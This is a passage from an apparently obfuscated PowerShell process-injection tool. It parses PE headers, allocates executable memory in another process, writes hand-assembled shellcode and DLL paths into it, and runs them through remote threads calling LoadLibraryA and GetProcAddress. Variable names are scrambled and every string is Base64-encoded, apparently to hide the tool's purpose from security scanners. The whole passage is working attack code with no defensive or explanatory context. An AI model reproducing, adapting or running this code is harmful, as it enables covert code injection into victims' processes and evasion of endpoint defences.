	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${/==\/====\/\_/=\/}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${/==\__/\/==\__/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${/==\/====\/\_/=\/}
			${/==\__/\/==\__/\/} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${/=\___/\/\/\/===\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/==\______/\}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${/==\__/\/==\__/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${/=\___/\/\/\/===\}
			${/==\__/\/==\__/\/} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${/==\__/\/==\__/\/}
	}
	Function ____/\/\/\___/====
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${_/=\_/\/\/=\___/=\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${__/\/\_/\__/\___/=} = New-Object System.Object
		[IntPtr]${_/\_/\/\/==\/==\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\_/\/\/=\___/=\}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${_/=\_/\/\/=\___/=\}, 0, ${_/\_/\/\/==\/==\/}, ${_/=\_/\/\/=\___/=\}.Length) | Out-Null
		${/==\__/\/==\__/\/} = _/===\__/\_/\/=\/= -__/\/\/\_/\/=\/=\_ ${_/\_/\/\/==\/==\/} -Win32Types $Win32Types
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${/==\__/\/==\__/\/}.PE64Bit)
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/\_/\/\/==\/==\/})
		return ${__/\/\_/\__/\___/=}
	}
	Function _/==\_/=\/\/=\/==\
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/\/\_/\/=\/=\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		if (${__/\/\/\_/\/=\/=\_} -eq $null -or ${__/\/\/\_/\/=\/=\_} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${__/\/\_/\__/\___/=} = New-Object System.Object
		${/==\__/\/==\__/\/} = _/===\__/\_/\/=\/= -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_} -Win32Types $Win32Types
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${__/\/\/\_/\/=\/=\_}
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS)
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${/==\__/\/==\__/\/}.NtHeadersPtr)
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${/==\__/\/==\__/\/}.PE64Bit)
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${__/\/\_/\__/\___/=}.PE64Bit -eq $true)
		{
			[IntPtr]${___/\__/\/\/\/==\} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${___/\__/\/\/\/==\}
		}
		else
		{
			[IntPtr]${___/\__/\/\/\/==\} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${___/\__/\/\/\/==\}
		}
		if ((${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${/==\__/\/==\__/\/}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${__/\/\_/\__/\___/=}
	}
	Function _/=\/\___/====\/==
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${_/==\_/\/=\/=\/=\_},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${__/==\_/\/\____/\/}
		)
		${_/=\/==\____/==\_} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${_/=\_/\_/=\/\_/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/==\_/\/\____/\/})
		${__/\_/=\_/\_/\_/=} = [UIntPtr][UInt64]([UInt64]${_/=\_/\_/=\/\_/=\}.Length + 1)
		${___/\__/\/==\__/=} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, [IntPtr]::Zero, ${__/\_/=\_/\_/\_/=}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${___/\__/\/==\__/=} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${__/\/=\/\________} = [UIntPtr]::Zero
		${_/\/\__/\___/\___} = $Win32Functions.WriteProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${___/\__/\/==\__/=}, ${__/==\_/\/\____/\/}, ${__/\_/=\_/\_/\_/=}, [Ref]${__/\/=\/\________})
		if (${_/\/\__/\___/\___} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${__/\_/=\_/\_/\_/=} -ne ${__/\/=\/\________})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${/=\_/===\/==\_/==} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${/====\_/\___/=\/\} = $Win32Functions.GetProcAddress.Invoke(${/=\_/===\/==\_/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${_/\/=\_/\/\/==\/=} = [IntPtr]::Zero
		if (${__/\/\_/\__/\___/=}.PE64Bit -eq $true)
		{
			${/=====\___/=\__/=} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, [IntPtr]::Zero, ${__/\_/=\_/\_/\_/=}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if (${/=====\___/=\__/=} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${___/\_/\__/====\/} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${/=\_____/=\/\/==\} = @(0x48, 0xba)
			${_/=\____/====\_/\} = @(0xff, 0xd2, 0x48, 0xba)
			${___/==\/====\_/=\} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${/==\___/\/\/\/\_/} = ${___/\_/\__/====\/}.Length + ${/=\_____/=\/\/==\}.Length + ${_/=\____/====\_/\}.Length + ${___/==\/====\_/=\}.Length + (${_/=\/==\____/==\_} * 3)
			${_/\/\/\/\/=\_/=\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/==\___/\/\/\/\_/})
			${_/====\__/==\____} = ${_/\/\/\/\/=\_/=\_}
			__/\_/====\/==\/\_ -____/\___/\/===\/= ${___/\_/\__/====\/} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
			${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${___/\_/\__/====\/}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\__/\/==\__/=}, ${_/\/\/\/\/=\_/=\_}, $false)
			${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
			__/\_/====\/==\/\_ -____/\___/\/===\/= ${/=\_____/=\/\/==\} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
			${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${/=\_____/=\/\/==\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/====\_/\___/=\/\}, ${_/\/\/\/\/=\_/=\_}, $false)
			${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
			__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/=\____/====\_/\} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
			${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\____/====\_/\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=====\___/=\__/=}, ${_/\/\/\/\/=\_/=\_}, $false)
			${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
			__/\_/====\/==\/\_ -____/\___/\/===\/= ${___/==\/====\_/=\} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
			${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${___/==\/====\_/=\}.Length)
			${/==\_/===\___/\/\} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, [IntPtr]::Zero, [UIntPtr][UInt64]${/==\___/\/\/\/\_/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${/==\_/===\___/\/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${_/\/\__/\___/\___} = $Win32Functions.WriteProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\_/===\___/\/\}, ${_/====\__/==\____}, [UIntPtr][UInt64]${/==\___/\/\/\/\_/}, [Ref]${__/\/=\/\________})
			if ((${_/\/\__/\___/\___} -eq $false) -or ([UInt64]${__/\/=\/\________} -ne [UInt64]${/==\___/\/\/\/\_/}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${________/\_/\__/=} = _/=\/=\____/\____/ -_____/====\/\/==\_ ${_/==\_/\/=\/=\/=\_} -___/==\/\/\_______ ${/==\_/===\___/\/\} -Win32Functions$Win32Functions 
			${/====\___/\/=\/==} = $Win32Functions.WaitForSingleObject.Invoke(${________/\_/\__/=}, 20000)
			if (${/====\___/\/=\/==} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${/======\/\_/=\_/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/==\____/==\_})
			${/====\___/\/=\/==} = $Win32Functions.ReadProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${/=====\___/=\__/=}, ${/======\/\_/=\_/=}, [UIntPtr][UInt64]${_/=\/==\____/==\_}, [Ref]${__/\/=\/\________})
			if (${/====\___/\/=\/==} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${_/\/=\_/\/\/==\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/======\/\_/=\_/=}, [Type][IntPtr])
			$Win32Functions.VirtualFreeEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${/=====\___/=\__/=}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\_/===\___/\/\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${________/\_/\__/=} = _/=\/=\____/\____/ -_____/====\/\/==\_ ${_/==\_/\/=\/=\/=\_} -___/==\/\/\_______ ${/====\_/\___/=\/\} -__/=\/=\_/=\__/\__ ${___/\__/\/==\__/=} -Win32Functions$Win32Functions 
			${/====\___/\/=\/==} = $Win32Functions.WaitForSingleObject.Invoke(${________/\_/\__/=}, 20000)
			if (${/====\___/\/=\/==} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${____/\_/=\/\/====} = 0
			${/====\___/\/=\/==} = $Win32Functions.GetExitCodeThread.Invoke(${________/\_/\__/=}, [Ref]${____/\_/=\/\/====})
			if ((${/====\___/\/=\/==} -eq 0) -or (${____/\_/=\/\/====} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${_/\/=\_/\/\/==\/=} = [IntPtr]${____/\_/=\/\/====}
		}
		$Win32Functions.VirtualFreeEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${___/\__/\/==\__/=}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${_/\/=\_/\/\/==\/=}
	}
	Function _/=\__/\/\_/\__/==
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${_/==\_/\/=\/=\/=\_},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${_____/\/\/====\__/},
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		${__/\___/\__/\__/=\}
		)
		${_/=\/==\____/==\_} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${/=\/==\/=\__/=\_/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/\___/\__/\__/=\})
		${____/=\__/=\/====} = [UIntPtr][UInt64]([UInt64]${__/\___/\__/\__/=\}.Length + 1)
		${/==\__/\/\/\_/=\/} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, [IntPtr]::Zero, ${____/=\__/=\/====}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${/==\__/\/\/\_/=\/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${__/\/=\/\________} = [UIntPtr]::Zero
		${_/\/\__/\___/\___} = $Win32Functions.WriteProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\__/\/\/\_/=\/}, ${/=\/==\/=\__/=\_/}, ${____/=\__/=\/====}, [Ref]${__/\/=\/\________})
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/=\/==\/=\__/=\_/})
		if (${_/\/\__/\___/\___} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${____/=\__/=\/====} -ne ${__/\/=\/\________})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${/=\_/===\/==\_/==} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${/=\__/=\_/==\_/\/} = $Win32Functions.GetProcAddress.Invoke(${/=\_/===\/==\_/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${_/\/\/\__/\/===\/} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, [IntPtr]::Zero, [UInt64][UInt64]${_/=\/==\____/==\_}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${_/\/\/\__/\/===\/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]${____/==\/\___/\/\} = @()
		if (${__/\/\_/\__/\___/=}.PE64Bit -eq $true)
		{
			${/=\_/==\/==\/=\/\} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${_/\/\_/\/\/\/\/\/} = @(0x48, 0xba)
			${__/====\_/==\_/\_} = @(0x48, 0xb8)
			${__/=\_/==\_/=\/==} = @(0xff, 0xd0, 0x48, 0xb9)
			${_/\__/\_/=====\_/} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${/=\_/==\/==\/=\/\} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${_/\/\_/\/\/\/\/\/} = @(0xb9)
			${__/====\_/==\_/\_} = @(0x51, 0x50, 0xb8)
			${__/=\_/==\_/=\/==} = @(0xff, 0xd0, 0xb9)
			${_/\__/\_/=====\_/} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${/==\___/\/\/\/\_/} = ${/=\_/==\/==\/=\/\}.Length + ${_/\/\_/\/\/\/\/\/}.Length + ${__/====\_/==\_/\_}.Length + ${__/=\_/==\_/=\/==}.Length + ${_/\__/\_/=====\_/}.Length + (${_/=\/==\____/==\_} * 4)
		${_/\/\/\/\/=\_/=\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/==\___/\/\/\/\_/})
		${_/====\__/==\____} = ${_/\/\/\/\/=\_/=\_}
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${/=\_/==\/==\/=\/\} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${/=\_/==\/==\/=\/\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_____/\/\/====\__/}, ${_/\/\/\/\/=\_/=\_}, $false)
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/\/\_/\/\/\/\/\/} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/\/\_/\/\/\/\/\/}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\__/\/\/\_/=\/}, ${_/\/\/\/\/=\_/=\_}, $false)
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${__/====\_/==\_/\_} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${__/====\_/==\_/\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\__/=\_/==\_/\/}, ${_/\/\/\/\/=\_/=\_}, $false)
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${__/=\_/==\_/=\/==} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${__/=\_/==\_/=\/==}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/\/\__/\/===\/}, ${_/\/\/\/\/=\_/=\_}, $false)
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/\__/\_/=====\_/} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
		${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/\__/\_/=====\_/}.Length)
		${/==\_/===\___/\/\} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, [IntPtr]::Zero, [UIntPtr][UInt64]${/==\___/\/\/\/\_/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if (${/==\_/===\___/\/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		${_/\/\__/\___/\___} = $Win32Functions.WriteProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\_/===\___/\/\}, ${_/====\__/==\____}, [UIntPtr][UInt64]${/==\___/\/\/\/\_/}, [Ref]${__/\/=\/\________})
		if ((${_/\/\__/\___/\___} -eq $false) -or ([UInt64]${__/\/=\/\________} -ne [UInt64]${/==\___/\/\/\/\_/}))
		{
